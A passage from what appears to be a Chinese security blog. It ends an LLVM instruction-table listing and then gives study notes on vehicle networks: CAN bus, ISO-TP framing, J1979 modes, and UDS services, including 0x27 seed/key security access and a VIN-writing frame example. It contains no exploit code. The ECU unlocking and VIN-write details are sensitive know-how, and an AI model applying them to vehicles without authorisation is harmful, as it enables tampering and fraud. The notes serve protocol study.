class="number">21</span>, FDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">22</span>, URem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">23</span>, SRem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">24</span>, FRem , BinaryOperator)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logical operators (integer operands)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">25</span>, Shl  , BinaryOperator) <span class="comment">// Shift left  (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">26</span>, LShr , BinaryOperator) <span class="comment">// Shift right (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">27</span>, AShr , BinaryOperator) <span class="comment">// Shift right (arithmetic)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">28</span>, And  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">29</span>, Or   , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">30</span>, Xor  , BinaryOperator)</span><br><span class="line">  LAST_BINARY_INST(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory operators...</span></span><br><span class="line"> FIRST_MEMORY_INST(<span class="number">31</span>)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">31</span>, Alloca, AllocaInst)  <span class="comment">// Stack management</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">32</span>, Load  , LoadInst  )  <span class="comment">// Memory manipulation instrs</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">33</span>, Store , StoreInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">34</span>, GetElementPtr, GetElementPtrInst)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">35</span>, Fence , FenceInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">36</span>, AtomicCmpXchg , AtomicCmpXchgInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">37</span>, AtomicRMW , AtomicRMWInst )</span><br><span class="line">  LAST_MEMORY_INST(<span class="number">37</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cast operators ...</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The order matters here because CastInst::isEliminableCastPair</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> (see Instructions.cpp) encodes a table based on this ordering.</span></span><br><span class="line"> FIRST_CAST_INST(<span class="number">38</span>)</span><br><span class="line">HANDLE_CAST_INST(<span class="number">38</span>, Trunc   , TruncInst   )  <span class="comment">// Truncate integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">39</span>, ZExt    , ZExtInst    )  <span class="comment">// Zero extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">40</span>, SExt    , SExtInst    )  <span class="comment">// Sign extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">41</span>, FPToUI  , FPToUIInst  )  <span class="comment">// floating point -&gt; UInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">42</span>, FPToSI  , FPToSIInst  )  <span class="comment">// floating point -&gt; SInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">43</span>, UIToFP  , UIToFPInst  )  <span class="comment">// UInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">44</span>, SIToFP  , SIToFPInst  )  <span class="comment">// SInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">45</span>, FPTrunc , FPTruncInst )  <span class="comment">// Truncate floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">46</span>, FPExt   , FPExtInst   )  <span class="comment">// Extend floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">47</span>, PtrToInt, PtrToIntInst)  <span class="comment">// Pointer -&gt; Integer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">48</span>, IntToPtr, IntToPtrInst)  <span class="comment">// Integer -&gt; Pointer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">49</span>, BitCast , BitCastInst )  <span class="comment">// Type cast</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">50</span>, AddrSpaceCast, AddrSpaceCastInst)  <span class="comment">// addrspace cast</span></span><br><span class="line">  LAST_CAST_INST(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"> FIRST_FUNCLETPAD_INST(<span class="number">51</span>)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">51</span>, CleanupPad, CleanupPadInst)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">52</span>, CatchPad  , CatchPadInst)</span><br><span class="line">  LAST_FUNCLETPAD_INST(<span class="number">52</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other operators...</span></span><br><span class="line"> FIRST_OTHER_INST(<span class="number">53</span>)</span><br><span class="line">HANDLE_OTHER_INST(<span class="number">53</span>, ICmp   , ICmpInst   )  <span class="comment">// Integer comparison instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">54</span>, FCmp   , FCmpInst   )  <span class="comment">// Floating point comparison instr.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, PHI    , PHINode    )  <span class="comment">// PHI node instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">56</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">57</span>, Select , SelectInst )  <span class="comment">// select instruction</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">58</span>, UserOp1, Instruction)  <span class="comment">// May be used internally in a pass</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">59</span>, UserOp2, Instruction)  <span class="comment">// Internal to passes only</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">60</span>, VAArg  , VAArgInst  )  <span class="comment">// vaarg instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">61</span>, ExtractElement, ExtractElementInst)<span class="comment">// extract from vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">62</span>, InsertElement, InsertElementInst)  <span class="comment">// insert into vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">63</span>, ShuffleVector, ShuffleVectorInst)  <span class="comment">// shuffle two vectors.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">64</span>, ExtractValue, ExtractValueInst)<span class="comment">// extract from aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">65</span>, InsertValue, InsertValueInst)  <span class="comment">// insert into aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">66</span>, LandingPad, LandingPadInst)  <span class="comment">// Landing pad instruction.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">67</span>, Freeze, FreezeInst) <span class="comment">// Freeze instruction.</span></span><br><span class="line">  LAST_OTHER_INST(<span class="number">67</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_TERM_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_UNARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_BINARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_MEMORY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_CAST_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_FUNCLETPAD_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>  FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span>   LAST_OTHER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_USER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="参考："   >
          <a href="#参考：" class="heading-link"><i class="fas fa-link"></i></a><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1>
      <p>[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_9" >原创] LLVM PASS PWN 总结-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/10/%E8%BD%A6%E8%81%94%E7%BD%91%E7%AC%94%E8%AE%B0/">车联网</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-07-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-03-08</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="CAN总线协议"   >
          <a href="#CAN总线协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#CAN总线协议" class="headerlink" title="CAN总线协议"></a>CAN总线协议</h1>
      <p>网络内的节点个数在理论上不受限制，可在各节点之间实现自由通信</p>

        <h2 id="1-通信机制"   >
          <a href="#1-通信机制" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-通信机制" class="headerlink" title="1.通信机制"></a>1.通信机制</h2>
      <p>通过高低电压来传输0、1，有两条线可以传输电压信息，分别为CAN高（CAN_H)和CAN低(CAN_L）。</p>
<div class="table-container"><table>
<thead>
<tr>
<th></th>
<th>电压</th>
<th>电压</th>
</tr>
</thead>
<tbody><tr>
<td>CAN_H</td>
<td>2.5V</td>
<td>3.5V</td>
</tr>
<tr>
<td>CAN_L</td>
<td>2.5V</td>
<td>1.5V</td>
</tr>
<tr>
<td>传输信号</td>
<td>1(隐式)</td>
<td>0(显式)</td>
</tr>
</tbody></table></div>
<p>差分电压CAN_diff = 0V，表示逻辑“1”，为隐性；</p>
<p>差分电压CAN_diff = 2V，表示逻辑“0”，为显性；</p>

        <h2 id="2-帧解析"   >
          <a href="#2-帧解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-帧解析" class="headerlink" title="2.帧解析"></a>2.帧解析</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230706111321971.png" alt="image-20230706111321971"></p>
<p>主要关注数据场。</p>
<p>还有CANFD是基于CAN协议的扩展协议</p>

        <h2 id="3-ISO-TP协议"   >
          <a href="#3-ISO-TP协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ISO-TP协议" class="headerlink" title="3.ISO-TP协议"></a>3.ISO-TP协议</h2>
      <p>具体协议如下</p>
<ul>
<li>单帧：数据域地第一个字节的高四位的十六进制值为0时，代表单帧数据。第一个字节的低四位代表数据长度，比如一个CAN帧<code>02 10 01 00 00 00 00 00</code>，即第一个字节为<code>02</code>，高四位为<code>0</code>，代表单帧，低四位为<code>2</code>，代表数据长度为<code>2</code>，即为后面的<code>10 01</code>。</li>
<li>首帧：在多帧传输中，数据域的第一个字节的高四位的十六进制值为<code>1</code>时，代表这是多帧数据传输的第一帧，数据域的第一个字节的低四位与第二个字节代表数据帧的长度。比如一个<code>CAN</code>帧<code>10 14 2E F1 90 01 02 03 </code>，即第一个字节为<code>10</code>，高四位为<code>1</code>，代表这是多帧数据传输的第一帧，低四位为<code>0</code>，加上第二个字节<code>14</code>，那么代表该次多帧传输会传输<code>0x014</code>个字节，后面的<code>2e f1 90 01 02 03</code>即为传输的有效数据，一直到不为连续帧，中间的即为总的<code>0x014</code>个字节数据。</li>
<li>连续帧：在多帧传输中作为首帧的后续帧，数据域的第一个字节的高四位为<code>2</code>，第一个字节的低四位为连续帧的编号。比如一个<code>CAN</code>帧<code>21 04 05 06 07 08 09 0A</code>，即第一个字节为<code>21</code>，高四位为<code>2</code>，代表这是连续帧，低四位为<code>1</code>，代表这是连续帧中编号为<code>1</code>的连续帧，后面的<code>04 05 06 07 08 09 0a </code>即为传输的数据。</li>
<li>流控帧：用于调节连续帧发送的速率。流控帧数据域的第一个字节的高四位为<code>3</code>。</li>
</ul>

        <h2 id="4-SAE-J1979协议"   >
          <a href="#4-SAE-J1979协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-SAE-J1979协议" class="headerlink" title="4.SAE J1979协议"></a>4.SAE J1979协议</h2>
      <p>该协议属于应用层协议，对应国标为ISO 15031-5，定义了10种模式</p>
<ul>
<li>模式01：请求动力系诊断数据，如发动机转速、温度、车速等</li>
<li>模式02：请求冻结帧数据，冻结帧数据时在故障发送和故障码被定义时存储的，用于反映故障发生时的环境信息，便于处理故障。</li>
<li>模式03：请求排放相关的诊断故障码，故障码的定义见<code>ISO 15031-6</code>。</li>
<li>模式04：清除/复位与排放相关的诊断信息，即维修后需要清除相关的故障码和冻结帧数据。</li>
<li>模式05：请求氧传感器检测结果，显示氧传感器检测页面和一些测试结果。</li>
<li>模式06：请求指定检测系统的测试结果，除氧传感器外还有其他的比如催化剂系统、蒸发系统等需要进行检测。</li>
<li>模式07：请求排放相关的未决故障码，维修人员通常用这个来确认是否已经正确维修且清除了故障码。</li>
<li>模式08：请求组件/系统的控制操作，具体功能由车辆制造商指定。</li>
<li>模式09：请求车辆信息，比如车厂、型号、品牌、发动机号等。</li>
<li>模式0A：请求排放相关的永久故障码，这类故障码一旦产生就不能清除改写。</li>
</ul>
<p>比如请求车架号的<code>CAN</code>帧，所属模式为<code>09</code>，信息类型为<code>02</code>，消息长度为<code>02</code>，那么单帧传输，实际请求数据的CAN帧为</p>
<p><code>02 09 02 00 00 00 00 00</code></p>
<p>返回的数据为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 14 49 02 01 31 47 31</span><br><span class="line">21 4a 43 35 34 34 34 52</span><br><span class="line">22 37 32 35 32 33 36 37</span><br></pre></td></tr></table></div></figure>

<p>其中首帧中<code>49</code>即为针对<code>09</code>的正响应。</p>

        <h2 id="5-UDS诊断协议"   >
          <a href="#5-UDS诊断协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-UDS诊断协议" class="headerlink" title="5.UDS诊断协议"></a>5.UDS诊断协议</h2>
      <p>可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42957717/category_11007796.html" >ISO 14229_小趴菜_自动驾驶搬砖人的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>通过对数据场的各个字节判断来得到相关的指令</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230706111731754.png" alt="image-20230706111731754"></p>
<ul>
<li>Tester：代表测试方</li>
<li>ECU：代表车机的ECU模块</li>
<li>网络层字节（蓝色块）：数据场的第一个字节，被网络层占用，一般不用管</li>
<li>SID标识字节：数据场的第二个字节，代表SID(Service Identifier)诊断服务ID，表示服务标识。<ul>
<li>Tester：比如这里Tester请求0x10服务，代表想进入编程模式。</li>
<li>ECU：同样也是在这个字节进行服务反馈，比如Tester请求0x10服务，那么ECU返回的数据场的第二个字节SID就有如下几种表示<ul>
<li>肯定：返回[SID+0x40]，这里就是0x10+0x40=0x50，代表ECU给出肯定响应，同意进入编程模式</li>
<li>否定：返回[0x7F]，然后SID下一个字节表示否定的服务，这里请求的是0x10服务，那么SID下一个字节就会是0x10，表示否定0x10服务，不能进入编程模式。同时SID后两个字节位置会显示NRC否定响应码，即图中红色部分，不同的NRC有不同的含义，完整版请参照ISO14229附录A。</li>
</ul>
</li>
</ul>
</li>
<li>子功能/否定服务SID标识：数据场的第三个字节，在Tester和ECU端有不同的含义<ul>
<li>Tester：表示子功能服务，比如0x10服务下还具有01 Default默认会话，02 Programming编程会话，03 Extended扩展会话几个子功能，就在这里标识出来。</li>
<li>ECU：同样表示整体服务的反馈<ul>
<li>肯定：返回正常的子功能表示，比如这里第三行中ECU对第二行中Tester要求的0x10服务下的03子服务进行了肯定反馈。</li>
<li>否定：这个在SID标识字节中进行了介绍，和主服务显示一致。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>其他的后续理解</p>
<p>大致的服务如下，主要用到的是具有背景颜色的部分</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230706113220550.png" alt="image-20230706113220550"></p>
<p>注：特殊的NRC-0x78，不太懂</p>

        <h2 id="6-UDS重点服务"   >
          <a href="#6-UDS重点服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-UDS重点服务" class="headerlink" title="6.UDS重点服务"></a>6.UDS重点服务</h2>
      
        <h3 id="0x10诊断会话服务"   >
          <a href="#0x10诊断会话服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x10诊断会话服务" class="headerlink" title="0x10诊断会话服务"></a>0x10诊断会话服务</h3>
      <p>Diagnostic Session Control服务</p>
<p>0x10包含3个子功能，01 Default默认会话，02 Programming编程会话，03 Extended扩展会话，ECU上电时，进入的是默认会话（Default），通过会话模式来进行权限控制。当进入一个非默认会话模式，就会有定时器开始计时，一段时间没有请求，时间限制到了就退回到默认会话01。有一个0x3E服务可以使得诊断保持在非默认会话状态。</p>

        <h3 id="0x27安全访问"   >
          <a href="#0x27安全访问" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x27安全访问" class="headerlink" title="0x27安全访问"></a>0x27安全访问</h3>
      
        <h4 id="服务流程"   >
          <a href="#服务流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#服务流程" class="headerlink" title="服务流程"></a>服务流程</h4>
      <p>ECU当中有很多数据是整车厂独有的，并不希望开放给所有客户，它需要做一个保密的设定。在读取一些特殊数据的时候，要先进行一个安全解锁。ECU上电之后是一个锁定的状态（Locked），通过0x27服务，加上一个子服务，再加上一个钥匙，这样的服务请求可以进行解锁。具体的形式如下，这里的n具体情况具体设置。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.drawio.png" alt="未命名绘图.drawio"></p>
<p>比如n=1的情况，即2n-1=1，子服务为0x01，如下所示，其中AA~DD即为种子Seed</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/aaa.png" alt="aaa"></p>
<p>具体的例子如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line">Tester： 02 27 05 00 00 00 00 00 安全访问，05子功能</span><br><span class="line">ECU：    06 67 05 08 27 11 F0 00 肯定响应，回复了对应安全级别的种子</span><br><span class="line">Tester： 06 27 06 FF FF FF FF 00 发送密钥，4个FF。注意06是与05成对使用的。</span><br><span class="line"></span><br><span class="line">ECU：    03 7F 27 78 00 00 00 00 若为否定响应，7F+27+NRC</span><br><span class="line">ECU：    02 67 06 00 00 00 00 00 若为肯定响应，通过安全校验</span><br></pre></td></tr></table></div></figure>


        <h4 id="加密算法"   >
          <a href="#加密算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h4>
      <p>加密算法主要有三个主体：</p>
<ul>
<li><p>第一个主体seed，通常与ECU的运行时间有关系，是主料，在27服务发送奇数子功能时回复。seed通常一直在发生变化，无法发现其规律。</p>
</li>
<li><p>第二个主体通常和ECU有关。比如我们先用22服务读取ECU的SN，取其中4个字节，作为“调味料”参与，显然这个“调味料”对于这个ECU来说是不变的，也能通过22服务方便的读取到。</p>
</li>
<li><p>第三个主体是执行次数，就是算法要执行几轮。执行1轮和2轮得到的结果肯定是不一样的</p>
</li>
</ul>
<p>举个简单的算法，比如seed和ECU的SN数据的前4个字节加一下，循环左移两位，执行3轮，return这个数作为key，结束。安全验证就是一把锁，算法越复杂，短时间解开的成本越高，越不易被破解掉。如果失败次数过多还会触发惩罚机制，一段时间内都无法再尝试解锁，防止人为的破解。</p>

        <h3 id="0x22读取数据服务"   >
          <a href="#0x22读取数据服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x22读取数据服务" class="headerlink" title="0x22读取数据服务"></a>0x22读取数据服务</h3>
      <ul>
<li><p>Request（请求）：22+DID（Data Identifier，通常是两个字节，代表要读取的数据标识符）</p>
</li>
<li><p>Response（响应）：62+DID+Data（其中Data即为返回的数据）</p>
</li>
</ul>
<p>实际的例子如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">03 22 F1 86 AA AA AA AA</span><br><span class="line">04 62 F1 86 01 AA AA AA</span><br></pre></td></tr></table></div></figure>

<p>这里的01即为返回的数据Data</p>
<p>其中DID有一部分已经被ISO 14229-1规定了。比如0xF186就是当前诊断会话数据标识符，0xF187就是车厂备件号数据标识符，0xF188就是车厂ECU软件号码数据ID，0xF189就是车厂ECU软件版本号数据标识符。</p>

        <h3 id="0x2E写入数据服务"   >
          <a href="#0x2E写入数据服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x2E写入数据服务" class="headerlink" title="0x2E写入数据服务"></a>0x2E写入数据服务</h3>
      <ul>
<li>Request（请求）：2E+DID+Data</li>
<li>Response（响应）：6E+DID</li>
</ul>
<p>协议如下</p>
<ul>
<li>单帧：数据域地第一个字节的高四位的十六进制值为0时，代表单帧数据。第一个字节的低四位代表数据长度，比如一个CAN帧<code>02 10 01 00 00 00 00 00</code>，即第一个字节为<code>02</code>，高四位为<code>0</code>，代表单帧，低四位为<code>2</code>，代表数据长度为<code>2</code>，即为后面的<code>10 01</code>。</li>
<li>首帧：在多帧传输中，数据域的第一个字节的高四位的十六进制值为<code>1</code>时，代表这是多帧数据传输的第一帧，数据域的第一个字节的低四位与第二个字节代表数据帧的长度。比如一个<code>CAN</code>帧<code>10 14 2E F1 90 01 02 03 </code>，即第一个字节为<code>10</code>，高四位为<code>1</code>，代表这是多帧数据传输的第一帧，低四位为<code>0</code>，加上第二个字节<code>14</code>，那么代表该次多帧传输会传输<code>0x014</code>个字节，后面的<code>2e f1 90 01 02 03</code>即为传输的有效数据，一直到不为连续帧，中间的即为总的<code>0x014</code>个字节数据。</li>
<li>连续帧：在多帧传输中作为首帧的后续帧，数据域的第一个字节的高四位为<code>2</code>，第一个字节的低四位为连续帧的编号。比如一个<code>CAN</code>帧<code>21 04 05 06 07 08 09 0A</code>，即第一个字节为<code>21</code>，高四位为<code>2</code>，代表这是连续帧，低四位为<code>1</code>，代表这是连续帧中编号为<code>1</code>的连续帧，后面的<code>04 05 06 07 08 09 0a </code>即为传输的数据。</li>
<li>流控帧：用于调节连续帧发送的速率。流控帧数据域的第一个字节的高四位为<code>3</code>。</li>
</ul>
<p>实际的例子如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10 14 2E F1 90 01 02 03</span><br><span class="line">30 00 0A AA AA AA AA AA</span><br><span class="line">21 04 05 06 07 08 09 0A</span><br><span class="line">22 0B 0C 0D 0E 0F 10 11</span><br><span class="line">03 6E F1 90 AA AA AA AA</span><br></pre></td></tr></table></div></figure>

<p>总共5个帧，一帧一帧的看</p>
<ul>
<li><p>第一帧：10 14 2E F1 90 01 02 03</p>
<ul>
<li><p>[10 14]：根据ISO15765-2标准0x10代表这是一组多帧中的首帧（属于传输层的信息），一会要发0x14=20个字节的有效数据。</p>
</li>
<li><p>[2E F1 90]：2E为写入服务，F190为DID，即为VIN码</p>
</li>
<li><p>[01 02 03]：这是将要写入VIN码的数据，为第1字节到第3字节</p>
</li>
</ul>
<p>代表想将这三个字节写入到VIN码数据，这件事情正常是发生在车辆下线时。</p>
</li>
<li><p>第二帧：30 00 0A AA AA AA AA AA</p>
<ul>
<li>[30 00 0A]：是TP层（传输层）的信息，表示这是一个流控帧，ECU发出的，表示可以一直连续发，但连续帧最短的间隔时间要求是0xA，即为10ms。</li>
</ul>
</li>
<li><p>第三帧：21 04 05 06 07 08 09 0A</p>
<ul>
<li>[21]：是TP层的信息，表示这是一个连续帧，序号为1。</li>
<li>[04 05 06 07 08 09]：这是VIN码的第4字节到第10字节。</li>
</ul>
</li>
<li><p>第四帧：22 0B 0C 0D 0E 0F 10 11</p>
<ul>
<li>[22]：是TP层的信息，表示这是一个连续帧，序号为2。</li>
<li>[0B 0C 0D 0E 0F 10 11]：这是VIN码的第11字节到第17字节。</li>
</ul>
</li>
<li><p>第五帧：03 6E F1 90 AA AA AA AA</p>
<ul>
<li>[03]：是TP层的信息，这里说的这个TP层的信息是传不到应用层的，即这是一个用完就会抛弃的信息。03的0表示这是一个单帧，3表示后面有3个有效字节。</li>
<li>[6E]：6E表示我们确认执行了2E服务的请求，这个请求写入的DID是F1 90，即VIN码。</li>
</ul>
</li>
</ul>
<p>注：对于0xF190等DID不支持直接写入数据的，需要用0x10服务来进行会话转换。也就是说，对于写数据的请求，一般来说需要在一个扩展会话，和安全等级1的状态下才能进行。</p>

        <h3 id="0x19读DTC服务"   >
          <a href="#0x19读DTC服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x19读DTC服务" class="headerlink" title="0x19读DTC服务"></a>0x19读DTC服务</h3>
      <p>DTC（diagnostic trouble code）：如果系统检测到了一个错误，它将存储为DTC。DTC可表现为：一个显而易见的故障；通讯信号的丢失（不会使故障灯亮起）；排放相关的故障；安全相关的错误等。DTC可以揭示错误的位置和错误类型，通常占用3个字节。一个DTC信息占用4个字节。最后一个字节是DTC的状态，不是错误信息的一部分。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230706214204610.png" alt="image-20230706214204610"></p>
<ul>
<li>第一个字节：在乘用车中，前两个bit代表P/C/B/U（动力Power/底盘Chassis/车身Body/网络Network）中的一个，之后六个bit是数字，合在一起的样子形如”P01”，其中P即为Power，形如用00/01/10/11分别表示P/C/B/U</li>
</ul>
<p>比如”U31 2345”这个故障码：U就是11，31就是110001，所以第一个字节即为11110001=F1，那么这个DTC就是 F1 23 45 09，其中09表示的是状态掩码。</p>

        <h4 id="常用的子服务"   >
          <a href="#常用的子服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用的子服务" class="headerlink" title="常用的子服务"></a>常用的子服务</h4>
      <p>19拥有28个子服务（Sub-Function），常用的有：</p>
<ul>
<li><p>01 (读取符合掩码条件的DTC数量)（必须支持）</p>
<p>后面的字节表示DTC状态掩码，若为01表示我想读当前故障，若为08表示我想读历史故障，若为09表示当前故障和历史故障都想读。</p>
<p>在肯定回复时，帧为59 01 09 01 00 01 XX，组合应该是59(19+40) - 01（子服务） - 09 （本ECU所支持的掩码条件）- 01 DTC的格式（ISO14229-1为01） - 00 01 （目前满足条件的DTC有一个）</p>
</li>
<li><p>02（读取符合掩码条件的DTC列表及其状态）（必须支持），后面的字节表示DTC状态掩码，解读同上。</p>
<p>肯定回复时，帧为59 02 09 xx xx xx 01，59 - 02（子功能）- 09（本ECU所支持的掩码条件） - XX XX XX ( DTC,车厂定义 ) - 01 （这个故障码怎么了，01表示当前故障）</p>
</li>
<li><p>04（读取快照信息），也叫冻结帧。</p>
</li>
<li><p>06（读取扩展信息）。</p>
</li>
<li><p>0A（读取ECU支持的所有DTC列表及其状态）（必须支持）。这个就不必发DTC状态掩码了。所有支持的DTC列表及其状态都会打印出来。</p>
</li>
</ul>

        <h3 id="0x14清除DTC服务"   >
          <a href="#0x14清除DTC服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x14清除DTC服务" class="headerlink" title="0x14清除DTC服务"></a>0x14清除DTC服务</h3>
